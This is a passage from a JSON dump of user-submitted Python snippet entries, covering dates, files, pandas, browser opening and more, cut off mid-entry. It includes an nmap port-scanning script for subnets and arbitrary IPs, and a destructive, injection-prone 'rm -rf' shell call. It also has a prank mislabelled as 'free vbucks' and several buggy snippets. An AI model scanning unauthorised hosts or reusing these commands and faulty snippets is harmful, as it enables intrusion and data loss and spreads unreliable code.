  {
    "id": 3567,
    "keyword": null,
    "link": null,
    "title": " python markdown indent",
    "description": "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This will appear with six space characters in front of it #      This will appear with six space characters in front of it \n",
    "reg_date": "2021-10-12T11:33:40.000Z"
  },
  {
    "id": 3568,
    "keyword": null,
    "link": null,
    "title": " python marker size",
    "description": ">>> plot(x, y, 'go--', linewidth=2, markersize=12) >>> plot(x, y, color='green', marker='o', linestyle='dashed', ...      linewidth=2, markersize=12) \n",
    "reg_date": "2021-10-12T11:33:40.000Z"
  },
  {
    "id": 3569,
    "keyword": null,
    "link": null,
    "title": " python match phone number",
    "description": "(\\d{3}[-\\.\\s]??\\d{3}[-\\.\\s]??\\d{4}|\\(\\d{3}\\)\\s*\\d{3}[-\\.\\s]??\\d{4}|\\d{3}[-\\.\\s]??\\d{4}) \n",
    "reg_date": "2021-10-12T11:33:40.000Z"
  },
  {
    "id": 3570,
    "keyword": null,
    "link": null,
    "title": " python math infinity",
    "description": "test = float(\"inf\")  In Python 3.5, you can do:  import math test = math.inf\n# Import math Library import math  # Print the positive infinity print (math.inf)  # Print the negative infinity print (-math.inf)\ntest = float(\"inf\")\n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3571,
    "keyword": null,
    "link": null,
    "title": " python math negative infinity",
    "description": "# Import math Library import math  # Print the positive infinity print (math.inf)  # Print the negative infinity print (-math.inf)\nfloat('-inf')\n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3572,
    "keyword": null,
    "link": null,
    "title": " python maths max value capped at x",
    "description": "def clamp(n, minn, maxn):     return max(min(maxn, n), minn)\n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3573,
    "keyword": null,
    "link": null,
    "title": " python matplotlib hist set axis range",
    "description": "# Basic syntax: plt.ylim(min,max) plt.xlim(min,max)  # Example usage: import matplotlib.pyplot as plt plt.plot(range(5)) plt.xlim(-5, 5) plt.ylim(-5, 5)  # Note, this approach is more versatile than using range=[min,max] which # \tonly works in some plots, e.g. plt.hist(range(5), range=[-5,5])\n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3574,
    "keyword": null,
    "link": null,
    "title": " python measure time",
    "description": "import time  start = time.time() print(\"hello\") end = time.time() print(end - start)\nimport datetime   currentDT = datetime.datetime.now() print(str(currentDT))  # prints XXXX-XX-XX XX:XX:XX.XXXXXX # or  import datetime   currentDT = datetime.datetime.now()   print (\"Current Year is: %d\" % currentDT.year) print (\"Current Month is: %d\" % currentDT.month) print (\"Current Day is: %d\" % currentDT.day) print (\"Current Hour is: %d\" % currentDT.hour) print (\"Current Minute is: %d\" % currentDT.minute) print (\"Current Second is: %d\" % currentDT.second) print (\"Current Microsecond is: %d\" % currentDT.microsecond) # prints \"\"\" Current Year is: XXXX Current Month is: XX Current Day is: XX Current Hour is: XX Current Minute is: XX Current Second is: XX Current Microsecond is: XXXXXX \"\"\"\nimport time start = time.process_time() # your code here     print(time.process_time() - start)\nimport time  start = time.time() print(\"hello\") end = time.time() print(end - start) \nimport time t0= time.clock() print(\"Hello\") t1 = time.clock() - t0 print(\"Time elapsed: \", t1) # CPU seconds elapsed (floating point)\nimport time  # Calculate the power of two for a defined range of number def power_two(my_range):     return [x**2 for x in range(my_range)]   # Measure time def measure_time(func):     start = time.time()     func()               # any specific function to measure     end = time.time()     print(end - start)        measure_time(lambda: power_two(10000000)) # lambda permits to pass the argument of our function\n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3575,
    "keyword": null,
    "link": null,
    "title": " python menu",
    "description": "from tkinter import * from tkinter import messagebox # just for example not necessary  # some example fungtions def Res():     root.geometry('333x222') def B2N():     root.geometry('444x444') def Full():     root.geometry('1000x700') def custom_quit():     answer=tkinter.messagebox.askokcancel(\"Are you Sure?\",\"Your Data will be lost if you exit\")     if (answer):         quit()          #the main window root=Tk() root.geometry('444x444') text=Label(root,text='*my first menu*').pack() # the actual menu (used a big example for better understanding of menu and sub-menu) menu1=Menu(root) root.configure(menu=menu1)  submenu1=Menu(menu1) menu1.add_cascade(label='File',menu=submenu1) sub2menu=Menu(submenu1) sub2menu.add_command(label='Recent') sub2menu.add_command(label='Browse')  submenu1.add_command(label='New File') submenu1.add_cascade(label='Open File',menu=sub2menu) submenu1.add_command(label='Save As') submenu1.add_command(label='Print') submenu1.add_command(label='Quit', command=custom_quit) # adding command to menu elements  submenu2=Menu(menu1) menu1.add_cascade(label='Edit',menu=submenu2) submenu2.add_command(label='Undo') submenu2.add_cascade(label='Redo') submenu2.add_command(label='Cut') submenu2.add_command(label='Copy') submenu2.add_command(label='Paste') submenu2.add_command(label='Select All')  submenu3=Menu(menu1) menu1.add_cascade(label='Format',menu=submenu3) submenu3.add_command(label='Indent Region') submenu3.add_cascade(label='Comment') submenu3.add_command(label='All') submenu3.add_command(label='Selected') submenu3.add_command(label='Format Paragraph')  submenu4=Menu(menu1) menu1.add_cascade(label='Run',menu=submenu4) submenu4.add_command(label='Python Shell') submenu4.add_cascade(label='Run Module') submenu4.add_command(label='Check Module')  submenu5=Menu(menu1) menu1.add_cascade(label='Options',menu=submenu5) submenu5.add_command(label='Configure IDLE') submenu5.add_cascade(label='Show Code Context') submenu5.add_command(label='Zoom Height')  submenu6=Menu(menu1) menu1.add_cascade(label='Window',menu=submenu6) submenu6.add_command(label='Python 3.7.3 shell') submenu6.add_cascade(label='Untitled') submenu6.add_command(label='Resize window',command=Res) submenu6.add_command(label='Norml size window',command=B2N) submenu6.add_command(label='Large window',command=Full)  submenu7=Menu(menu1) menu1.add_cascade(label='Help',menu=submenu7) submenu7.add_command(label='About IDLE') submenu7.add_cascade(label='IDLE Help') submenu7.add_command(label='FAQ') submenu7.add_command(label='Contact US')  \n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3576,
    "keyword": null,
    "link": null,
    "title": " python merge strings in columns",
    "description": "df[\"period\"] = df[\"Year\"].astype(str) + df[\"quarter\"] \n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3577,
    "keyword": null,
    "link": null,
    "title": " python merge two dictionaries in a single expression",
    "description": "z = {**x, **y}  #python 3.5 and above  z = x | y    #python 3.9+ ONLY  def merge_two_dicts(x, y): # python 3.4 or lower       z = x.copy()   # start with x's keys and values       z.update(y)    # modifies z with y's keys and values & returns None       return z\n>>> x = {'a': 1, 'b': 2} >>> y = {'b': 10, 'c': 11} >>> z = {**x, **y} #In Python 3.5 or greater only >>> print(z) {'a': 1, 'b': 10, 'c': 11} \n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3578,
    "keyword": null,
    "link": null,
    "title": " python method to filter vowels in a string",
    "description": "def anti_vowel(c):     newstr = c     vowels = ('a', 'e', 'i', 'o', 'u')     for x in c.lower():         if x in vowels:             newstr = newstr.replace(x,\"\")      return newstr \n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3579,
    "keyword": null,
    "link": null,
    "title": " python milliseconds to date",
    "description": "datetime.datetime.fromtimestamp(ms/1000.0)\n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3580,
    "keyword": null,
    "link": null,
    "title": " python min in dictionary",
    "description": "a_dictionary = {\"a\": 1, \"b\": 2, \"c\": 3}  # get key with min value min_key = min(a_dictionary, key=a_dictionary.get)  print(min_key) # print output => \"a\"\n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3581,
    "keyword": null,
    "link": null,
    "title": " python minute from datetime",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n",
    "reg_date": "2021-10-12T11:33:41.000Z"
  },
  {
    "id": 3582,
    "keyword": null,
    "link": null,
    "title": " python mkdir",
    "description": "if not os.path.exists(path):   os.mkdir(path)\nimport os import errno if not os.path.exists(value):     try:         os.makedirs(value, 0o700)     except OSError as e:         if e.errno != errno.EEXIST:             raise\n#the os module provides an operating system interface from Python import os #prints the name of the operating system print(os.name) #prints the absolute path for the module print(os.getcwd())\n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3583,
    "keyword": null,
    "link": null,
    "title": " python module for converting miles to km",
    "description": "miles = 30 conversion_factor = 0.62137119  kilometers = miles / conversion_factor print kilometers\nkilometers = 6 conversion_factor = 0.62137119  miles = kilometers / conversion_factor print miles\n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3584,
    "keyword": null,
    "link": null,
    "title": " python month number from date",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3585,
    "keyword": null,
    "link": null,
    "title": " python months between two dates",
    "description": "from datetime import datetime  def diff_month(d1, d2):     return (d1.year - d2.year) * 12 + d1.month - d2.month\n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3586,
    "keyword": null,
    "link": null,
    "title": " python move file",
    "description": "# To move a file in Python, use one of the following: import os import shutil  os.rename(\"path/to/current/file.foo\", \"path/to/new/destination/for/file.foo\") shutil.move(\"path/to/current/file.foo\", \"path/to/new/destination/for/file.foo\") os.replace(\"path/to/current/file.foo\", \"path/to/new/destination/for/file.foo\")  # In the first two cases the directory in which the new file # is being created must already exist.\nimport os, shutil #move picture.png from /some/dir/ to /another/dir/Pictures/ shutil.move('/some/dir/picture.png', '/another/dir/Pictures/')\nimport os import shutil  os.rename(\"path/to/current/file.foo\", \"path/to/new/destination/for/file.foo\") shutil.move(\"path/to/current/file.foo\", \"path/to/new/destination/for/file.foo\") os.replace(\"path/to/current/file.foo\", \"path/to/new/destination/for/file.foo\") \nimport shutil original = r'original path where the file is currently stored\\file name.file extension' target = r'target path where the file will be moved\\file name.file extension' shutil.move(original,target)\n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3587,
    "keyword": null,
    "link": null,
    "title": " python moving average pandas",
    "description": "df['pandas_SMA_3'] = df.iloc[:,1].rolling(window=3).mean() \n#Creating a 100 day moving average from 'Close Price' column df['Close Price'].rolling(100).mean()\ndf['MA'] = df.rolling(window=5).mean()  print(df) #             Value    MA # Date                    # 1989-01-02   6.11   NaN # 1989-01-03   6.08   NaN # 1989-01-04   6.11   NaN # 1989-01-05   6.15   NaN # 1989-01-09   6.25  6.14 # 1989-01-10   6.24  6.17 # 1989-01-11   6.26  6.20 # 1989-01-12   6.23  6.23 # 1989-01-13   6.28  6.25 # 1989-01-16   6.31  6.27 \n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3588,
    "keyword": null,
    "link": null,
    "title": " python moving average time series",
    "description": "#Creating a 100 day moving average from 'df' df.rolling(100).mean()\ndf['data'].rolling(3).mean() df['data'].shift(periods=1).rolling(3).mean()\n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3589,
    "keyword": null,
    "link": null,
    "title": " python multiline docstring styles",
    "description": "def some_function(argument1):     \"\"\"Summary or Description of the Function      Parameters:     argument1 (int): Description of arg1      Returns:     int:Returning value     \"\"\"      return argument1  print(some_function.__doc__) \nclass Vehicle(object):     '''     The Vehicle object contains lots of vehicles     :param arg: The arg is used for ...     :type arg: str     :param `*args`: The variable arguments are used for ...     :param `**kwargs`: The keyword arguments are used for ...     :ivar arg: This is where we store arg     :vartype arg: str     '''       def __init__(self, arg, *args, **kwargs):         self.arg = arg      def cars(self, distance, destination):         '''We can't travel a certain distance in vehicles without fuels, so here's the fuels          :param distance: The amount of distance traveled         :type amount: int         :param bool destinationReached: Should the fuels be refilled to cover required distance?         :raises: :class:`RuntimeError`: Out of fuel          :returns: A Car mileage         :rtype: Cars         '''           pass \ndef functionName():     \"\"\"     This is a function docstring     \"\"\"\n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3590,
    "keyword": null,
    "link": null,
    "title": " python multiplication table while loop",
    "description": " num = int(input(\"Multiplication using value? : \"))  while num <= 10:     i = 1     while i <= num:         product = num*i         print(num, \" * \", i, \" = \", product, \"\\n\")         i = i + 1     print(\"\\n\")     num = num + 1\na=int(input(\"enter table number\")) b=int(input(\"enter the number to which table is to printed\")) i=1 while i<=b:     print(a,\"x\",i,\"=\",a*i)     i=i+1 \nprabh\n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3591,
    "keyword": null,
    "link": null,
    "title": " python nCr n choose r function",
    "description": "# Basic syntax: from math import comb comb(n, r) # calculates \"n choose r\" aka nCr aka binomial coefficients\n",
    "reg_date": "2021-10-12T11:33:42.000Z"
  },
  {
    "id": 3592,
    "keyword": null,
    "link": null,
    "title": " python name = main",
    "description": "if __name__ == \"__main__\":   # Code inside of here will only run if the python script was launched directly   # This code will not run if imported as a module\n# It's as if the interpreter inserts this at the top # of your module when run as the main program. __name__ = \"__main__\" \n# Suppose this is foo.py.  print(\"before import\") import math  print(\"before functionA\") def functionA():     print(\"Function A\")  print(\"before functionB\") def functionB():     print(\"Function B {}\".format(math.sqrt(100)))  print(\"before __name__ guard\") if __name__ == '__main__':     functionA()     functionB() print(\"after __name__ guard\")\npython foo.py\n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3593,
    "keyword": null,
    "link": null,
    "title": " python name of current file",
    "description": "from pathlib import Path print(Path(__file__).stem) #myfile print(Path(__file__).name) #myfile.py\nimport os  os.path.basename(__file__)\nUse __file__. If you want to omit the directory part (which might be present), you can use os.path.basename(__file__)\n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3594,
    "keyword": null,
    "link": null,
    "title": " python namespace packages",
    "description": "from setuptools import find_packages, setup  setup(     name='mynamespace-subpackage-a',     ...     packages=find_packages()     namespace_packages=['mynamespace'] ) \n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3595,
    "keyword": null,
    "link": null,
    "title": " python nested functions get variables from function scope",
    "description": "def a():     val = True     def b():         nonlocal val         val = False\n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3596,
    "keyword": null,
    "link": null,
    "title": " python nested loop for a 2D list",
    "description": "list = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]  for i in range(0, len(list)): # loops over the external list     for j in range(0, len(list[i])): # loops over every internal list         print(list[i][j], end=\"\\t\") # prints the elements of the inner list seperated by a tab character     print(\"\\n\") # after every 3 iterations, print a new line/ shift to a new line      # OR you could use a much shorter way of writing the above nested loops # either one you choose, the logic is the same for both  for i in list:     for j in i:         print(j, end=\"\\t\")     print(\"\\n\")  # Expected Output: \"\"\" 1       2       3  4       5       6  7       8       9 \"\"\"\n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3597,
    "keyword": null,
    "link": null,
    "title": " python nmap",
    "description": "import nmap   scanner = nmap.PortScanner()   ip_addr = '127.0.0.1'   response = input(\"\"\"\\nPlease enter the type of scan you want to run                 1)SYN ACK Scan                 2)UDP Scan                 3)Comprehensive Scan                 4)Regular Scan                 5. OS Detection                 6. Multiple IP inputs                 7. Ping Scan\\n\"\"\") print(\"You have selected option: \", response)   # If user's input is 1, perform a SYN/ACK scan if response == '1':     print(\"Nmap Version: \", scanner.nmap_version())     # Here, v is used for verbose, which means if selected it will give extra information     # 1-1024 means the port number we want to search on     #-sS means perform a TCP SYN connect scan, it send the SYN packets to the host     scanner.scan(ip_addr,'1-1024', '-v -sS')     print(scanner.scaninfo())     # state() tells if target is up or down     print(\"Ip Status: \", scanner[ip_addr].state())     # all_protocols() tells which protocols are enabled like TCP UDP etc     print(\"protocols:\",scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['tcp'].keys())       # If user's input is 2, perform a UDP Scan    elif response == '2':     # Here, v is used for verbose, which means if selected it will give #extra information     # 1-1024 means the port number we want to search on     #-sU means perform a UDP SYN connect scan, it send the SYN packets to #the host     print(\"Nmap Version: \", scanner.nmap_version())     scanner.scan(ip_addr, '1-1024', '-v -sU')     print(scanner.scaninfo())     # state() tells if target is up or down     print(\"Ip Status: \", scanner[ip_addr].state())     # all_protocols() tells which protocols are enabled like TCP UDP etc     print(\"protocols:\",scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['udp'].keys())       # If user's input is 3, perform a Comprehensive scan elif response == '3':     print(\"Nmap Version: \", scanner.nmap_version())     # sS for SYN scan, sv probe open ports to determine what service and version they are running on     # O determine OS type, A tells Nmap to make an effort in identifying the target OS     scanner.scan(ip_addr, '1-1024', '-v -sS -sV -sC -A -O')     print(scanner.scaninfo())     print(\"Ip Status: \", scanner[ip_addr].state())     print(scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['tcp'].keys())       # If user's input is 4, perform a Regular Scan elif response == '4':     # Works on default arguments     scanner.scan(ip_addr)     print(scanner.scaninfo())     print(\"Ip Status: \", scanner[ip_addr].state())     print(scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['tcp'].keys())       elif response == '5':     print(scanner.scan(\"127.0.0.1\", arguments=\"-O\")['scan']['127.0.0.1']['osmatch'][1])   elif response == '6':     ip_addr = input()     print(\"Nmap Version: \", scanner.nmap_version())     # Here, v is used for verbose, which means if selected it will give extra information     # 1-1024 means the port number we want to search on     #-sS means perform a TCP SYN connect scan, it send the SYN packets to the host     scanner.scan(ip_addr,'1-1024', '-v -sS')     print(scanner.scaninfo())     # state() tells if target is up or down     print(\"Ip Status: \", scanner[ip_addr].state())     # all_protocols() tells which protocols are enabled like TCP UDP etc     print(\"protocols:\",scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['tcp'].keys())       elif response == '7':      scanner.scan(hosts='192.168.1.0/24', arguments='-n -sP -PE -PA21,23,80,3389')     hosts_list = [(x, scanner[x]['status']['state']) for x in scanner.all_hosts()]     for host, status in hosts_list:         print('{0}:{1}'.format(host, status))       else:     print(\"Please choose a number from the options above\") \npip3 install python-nmap\n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3598,
    "keyword": null,
    "link": null,
    "title": " python not null",
    "description": "test = \"hello world\"  if test is not None:   print(\"test is not None\")    test2 = None  if test2 is None:   print(\"test2 is None\")\n #variable var = \"hello python\"  #check is not null if var is not NaN:     print('Var is not null')  \n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3599,
    "keyword": null,
    "link": null,
    "title": " python now",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\nnow_time = datetime.datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\") print(now_time)\n\"\"\"Imports the datetime package from the Python library\"\"\" from datetime import datetime  \"\"\"Sets the variable now to the current date and time\"\"\" now = datetime.now()  \"\"\"The variable current_time contains the string values of the current time\"\"\" current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time)\n from datetime import datetime  now = datetime.now().time() # time object  print(\"now =\", now) print(\"type(now) =\", type(now))\t\n import time  t = time.localtime() current_time = time.strftime(\"%H:%M:%S\", t) print(current_time) \n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3600,
    "keyword": null,
    "link": null,
    "title": " python npr permutation calculation",
    "description": "# as of python 3.8 >>> import math >>> print(math.perm(3, 3)) 6\n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3601,
    "keyword": null,
    "link": null,
    "title": " python nullish coalescing operator",
    "description": "#use \"or\"  42    or \"something\"    # returns 42 0     or \"something\"    # returns \"something\" None  or \"something\"    # returns \"something\" False or \"something\"    # returns \"something\" \"\"    or \"something\"    # returns \"something\"\n",
    "reg_date": "2021-10-12T11:33:43.000Z"
  },
  {
    "id": 3602,
    "keyword": null,
    "link": null,
    "title": " python number divisible by two other numbers",
    "description": "def is_divisible(n,x,y):     divisible_one = n % x     divisible_two = n % y     if divisible_one == 0 and divisible_two ==0:         return print(True)     else:         return print(False)\n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3603,
    "keyword": null,
    "link": null,
    "title": " python number to array of digits",
    "description": " list(map(int, str(678))) [6, 7, 8]\n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3604,
    "keyword": null,
    "link": null,
    "title": " python numpy array check if all nans",
    "description": "np.all(np.isnan(numpy_array))\n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3605,
    "keyword": null,
    "link": null,
    "title": " python only numbers in string",
    "description": "print(\"012345\".isdecimal()) OUTPUT True print(\"a12345\".isdecimal()) OUTPUT False\nstring = \"abc123\" # Method 1 ''.join(char for char in string if char.isdigit())  #Method 2 import re re.sub(\"[^0-9]\", \"\", string)\n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3606,
    "keyword": null,
    "link": null,
    "title": " python open each file in directory",
    "description": "import os for filename in os.listdir(os.getcwd()):    with open(os.path.join(os.cwd(), filename), 'r') as f:\n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3607,
    "keyword": null,
    "link": null,
    "title": " python open encoding utf-8",
    "description": "from io import open f = open(\"test\", mode=\"r\", encoding=\"utf-8\")\n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3608,
    "keyword": null,
    "link": null,
    "title": " python open folder",
    "description": "import subprocess subprocess.Popen(r'explorer /select,\"C:\\path\\of\\folder\\file\"')\npath = 'C:\\\\Users\\\\Username\\\\Path\\\\To\\\\File' file=open(path, \"r\")\n>>> import os >>> entries = os.listdir('my_directory/') \nimport webbrowser  path = \"C:/Users/Username/PycharmProjects\" webbrowser.open(path) # Opens 'PycharmProjects' folder.\n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3609,
    "keyword": null,
    "link": null,
    "title": " python open folder in explorer",
    "description": "import subprocess subprocess.Popen(r'explorer /select,\"C:\\path\\of\\folder\\file\"')\nimport os import subprocess FILEBROWSER_PATH = os.path.join(os.getenv('WINDIR'), 'explorer.exe')  def explore(path):     # explorer would choke on forward slashes     path = os.path.normpath(path)      if os.path.isdir(path):         subprocess.run([FILEBROWSER_PATH, path])     elif os.path.isfile(path):         subprocess.run([FILEBROWSER_PATH, '/select,', os.path.normpath(path)])\nimport sys path = r'C:\\Program Files (x86)\\IronPython 2.7\\Lib' sys.path.append(path)  import subprocess subprocess.Popen('explorer \"C:\\temp\"')\nimport webbrowser  path = \"C:/Users/Username/PycharmProjects\" webbrowser.open(path) # Opens 'PycharmProjects' folder.\nimport easygui file = easygui.fileopenbox()\n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3610,
    "keyword": null,
    "link": null,
    "title": " python open link in browser",
    "description": "import webbrowser  webbrowser.open_new('http://www.facebook.com')\n#This code will give you free fortnite vbucks import webbrowser  for x in range(100):     webbrowser.open_new_tab(\"https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO\"\") \npython -m webbrowser -t \"http://www.python.org\" \n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3611,
    "keyword": null,
    "link": null,
    "title": " python open mat file",
    "description": "import scipy.io mat = scipy.io.loadmat('file.mat')\n#!python #!/usr/bin/env python from scipy.io import loadmat x = loadmat('test.mat') lon = x['lon'] lat = x['lat'] # one-liner to read a single variable lon = loadmat('test.mat')['lon'] \n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3612,
    "keyword": null,
    "link": null,
    "title": " python open new chrome tab",
    "description": "import webbrowser  url = 'http://docs.python.org/'  # MacOS chrome_path = 'open -a /Applications/Google\\ Chrome.app %s'  # Windows # chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'  # Linux # chrome_path = '/usr/bin/google-chrome %s'  webbrowser.get(chrome_path).open(url) \n",
    "reg_date": "2021-10-12T11:33:44.000Z"
  },
  {
    "id": 3613,
    "keyword": null,
    "link": null,
    "title": " python open url in incognito",
    "description": "import webbrowser  url = 'www.google.com' chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s --incognito'  webbrowser.get(chrome_path).open_new(url)\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3614,
    "keyword": null,
    "link": null,
    "title": " python open web browser",
    "description": "#This code will give you free fortnite vbucks import webbrowser  for x in range(100):     webbrowser.open_new_tab(\"https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO\"\") \nimport webbrowser webbrowser.open('https://www.youtube.com/watch?v=QtBDL8EiNZo')\n#Open google in python - MacOSX import os os.system(\"open https://google.com\")\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3615,
    "keyword": null,
    "link": null,
    "title": " python opposite ord()",
    "description": "chr()\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3616,
    "keyword": null,
    "link": null,
    "title": " python oprators",
    "description": "+ - *  % #are python Arithmetic Operators\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3617,
    "keyword": null,
    "link": null,
    "title": " python order dataframe according to date time",
    "description": "df = df.sort_values(by='DateTime1',ascending=True)\n>>> df.sort_values(by='Date') # This now sorts in date order         Date Symbol 0 2015-02-20      A 2 2015-08-21      A 1 2016-01-15      A\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3618,
    "keyword": null,
    "link": null,
    "title": " python os copy",
    "description": "from shutil import copyfile copyfile(src, dst)\nfrom shutil import copyfile copyfile(src, dst) \n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3619,
    "keyword": null,
    "link": null,
    "title": " python os if file exists",
    "description": "import os  os.path.exists(\"file.txt\") # Or folder, will return true or false\nimport os.path  if os.path.isfile('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\") \nimport os.path  if os.path.isfile('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\")\nimport os.path  if os.path.exists('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\")\nimport os file_exists = os.path.exists(\"example.txt\") # Returns boolean representing whether or not the file exists\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3620,
    "keyword": null,
    "link": null,
    "title": " python os make empty file",
    "description": "open(x, 'a').close()\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3621,
    "keyword": null,
    "link": null,
    "title": " python os remove file",
    "description": "import os filePath = '/home/somedir/Documents/python/logs'  if os.path.exists(filePath):     os.remove(filePath) else:     print(\"Can not delete the file as it doesn't exists\")\nimport os import shutil  if os.path.exists(\"demofile.txt\"):   os.remove(\"demofile.txt\") # one file at a time  os.rmdir(\"test_directory\") # removes empty directory shutil.rmtree(\"test_directory\") # removes not empty directory and its content \nimport os os.remove(\"filename.txt\")\nimport os os.system(f\"rm -rf {filename.txt}\")\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3622,
    "keyword": null,
    "link": null,
    "title": " python overwrite text that is already printed",
    "description": "for x in range(10):     print '{0}\\r'.format(x), print\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3623,
    "keyword": null,
    "link": null,
    "title": " python pad punctuation with spaces",
    "description": "# Basic syntax using regex: import re re.sub('characters_to_pad', r' \\1 ', string_of_characters) # Where you can specify which punctuation characters you want to pad in #\tcharacters_to_pad  # Example usage: import re your_string = 'bla. bla? bla.bla! bla...' # An intelligent sentence your_string = re.sub('([.,!()])', r' \\1 ', your_string) # your_string is updated in place print(your_string) --> bla .  bla? bla . bla !  bla .  .  .  # Notice that the '?' didn't have spaces added because it wasn't listed #\tamong the characters_to_pad in the above function\n",
    "reg_date": "2021-10-12T11:33:45.000Z"
  },
  {
    "id": 3624,
    "keyword": null,
    "link": null,
    "title": " python pad with zeros",
    "description": "my_str='9' my_str.zfill(2)\n>>> n = '4' >>> print(n.zfill(3)) 004\nf_num.strip().zfill(2)\n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3625,
    "keyword": null,
    "link": null,
    "title": " python palindrome code",
    "description": "n = input(\"Enter the word and see if it is palindrome: \") #check palindrome if n == n[::-1]:     print(\"This word is palindrome\") else:     print(\"This word is not palindrome\")\ns=input(\"enter:\") temp=s c=0 v=0 print(temp) for i in s:     c=c+1 for j in range(c):     if temp[v]==s[c-1]:         c=c-1         v=v+1         flag=1     else:         flag=0 if flag==1:     print(\"p\") elif flag==0:      print(\"no\") \n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3626,
    "keyword": null,
    "link": null,
    "title": " python pandas convert nan to 0",
    "description": "pandas.DataFrame.fillna(0)\n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3627,
    "keyword": null,
    "link": null,
    "title": " python pandas cumulative return",
